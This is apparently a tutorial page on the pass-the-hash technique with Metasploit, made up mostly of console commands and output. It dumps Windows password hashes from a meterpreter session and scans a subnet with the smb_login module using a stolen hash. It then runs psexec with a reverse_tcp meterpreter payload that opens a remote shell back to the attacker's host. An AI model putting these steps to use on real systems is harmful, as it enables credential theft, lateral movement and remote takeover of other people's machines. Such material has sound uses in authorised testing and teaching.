<!-- TITLE: Pass the hash -->
<!-- SUBTITLE: A quick summary of Pass the hash -->

After compromising a windows host and getting the password hashes, there are 2 things we can do with it. First, we could try crack the password, but that might take a while depending on the complexity of the password. The second thing we can do is to utilize the pass-the-hash technique to utilize the hash directly. Metasploit supports passing the hash in its smb_login scanner and psexec modules, so we have everything we need to look for and exploit other systems on the network that are using the same hash.

Starting with a meterpreter shell on a compromised host, we use the hashdump command in the priv extension to get the hashes

meterpreter > use priv
Loading extension priv...success.
meterpreter > hashdump
ASPNET:1007:8dcf90484a8a865818b424bbfb7721bd:cc8f39437a0ce1aa89d8807fe0d19ff6:::
FDCC User:1005:921988ba001dc8e1c41a0e2828864838:5f23a05483c0b292fdd922e6b05afa05:::
HelpAssistant:1004:58a8fff5b883a8711ae36084c7644de3:11a7f388fda7f3416d46e6526b346bd2:::
IUSR_XP_FDCC:1006:04b7ff08c649a1d89c1947c7b3a7f246:b92d0fff1430b892d0db3288c9352cab:::
IWAM_XP_FDCC:1011:7e7f6b4ead2513e6019df3d75dea76bd:0a14704580d7a904786b0d1bbbd152dc:::
Renamed_Admin:500:921988ba001dc8e1c41a0e2828864838:5f23a05483c0b292fdd922e6b05afa05:::
Renamed_Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:b656a8c9fc573685ded4bb5b3a4da7dc:::
testuser:1012:e52cac67419a9a22e1c7c53891cb0efa:1ac2b246585f699b8f90605f8c673a7d:::
User:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

Using the smb_login module, we can scan the network with a set of given credentials. However this time we will use the hash in place of the password. It will automatically be recognised as a hash and use the pass-the-hash technique rather than the standard password login.

msf exploit(psexec) > use auxiliary/scanner/smb/smb_login
msf auxiliary(smb_login) > set SMBUser testuser
SMBUser => testuser
msf auxiliary(smb_login) > set SMBPass e52cac67419a9a22e1c7c53891cb0efa:1ac2b246585f699b8f90605f8c673a7d
SMBPass => e52cac67419a9a22e1c7c53891cb0efa:1ac2b246585f699b8f90605f8c673a7d
msf auxiliary(smb_login) > set RHOSTS 192.168.1.140-160
RHOSTS => 192.168.1.140-160
msf auxiliary(smb_login) > run

[+] 192.168.1.142 - SUCCESSFUL LOGIN (Windows 5.1) 'testuser' : 'e52cac67419a9a22e1c7c53891cb0efa:1ac2b246585f699b8f90605f8c673a7d'
[*] Scanned 03 of 21 hosts (014% complete)
[*] Scanned 05 of 21 hosts (023% complete)
[*] Scanned 07 of 21 hosts (033% complete)
[*] Scanned 09 of 21 hosts (042% complete)
[*] Scanned 11 of 21 hosts (052% complete)
[*] Scanned 13 of 21 hosts (061% complete)
[*] Scanned 15 of 21 hosts (071% complete)
[+] 192.168.1.156 - SUCCESSFUL LOGIN (Windows 5.1) 'testuser' : 'e52cac67419a9a22e1c7c53891cb0efa:1ac2b246585f699b8f90605f8c673a7d'
[*] Scanned 17 of 21 hosts (080% complete)
[*] Scanned 19 of 21 hosts (090% complete)
[*] Scanned 21 of 21 hosts (100% complete)
[*] Auxiliary module execution completed

From the list of successful hosts we managed to login to, we can then use the psexec module to get shell. Same as with the smb_login module, we just use the hash in place of the password.

msf auxiliary(smb_login) > use windows/smb/psexec
msf exploit(psexec) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(psexec) > set LHOST 192.168.1.170
LHOST => 192.168.1.170
msf exploit(psexec) > set RHOST 192.168.1.142
RHOST => 192.168.1.142
msf exploit(psexec) > set SMBUser testuser
SMBUser => testuser
msf exploit(psexec) > set SMBPass e52cac67419a9a22e1c7c53891cb0efa:1ac2b246585f699b8f90605f8c673a7d
SMBPass => e52cac67419a9a22e1c7c53891cb0efa:1ac2b246585f699b8f90605f8c673a7d
msf exploit(psexec) > exploit

[*] Started reverse handler on 192.168.1.170:4444
[*] Connecting to the server...
[*] Authenticating as user 'testuser'...
[*] Uploading payload...
[*] Created \TQMmuuNp.exe...
[*] Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.1.142[\svcctl] ...
[*] Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.1.142[\svcctl] ...
[*] Obtaining a service manager handle...
[*] Creating a new service (BGODNowY - "MocMHGObJOWUHSQ")...
[*] Closing service handle...
[*] Opening service...
[*] Starting the service...
[*] Removing the service...
[*] Closing service handle...
[*] Deleting \TQMmuuNp.exe...
[*] Sending stage (748032 bytes) to 192.168.1.142
[*] Meterpreter session 7 opened (192.168.1.170:4444 -> 192.168.1.142:1029)

meterpreter >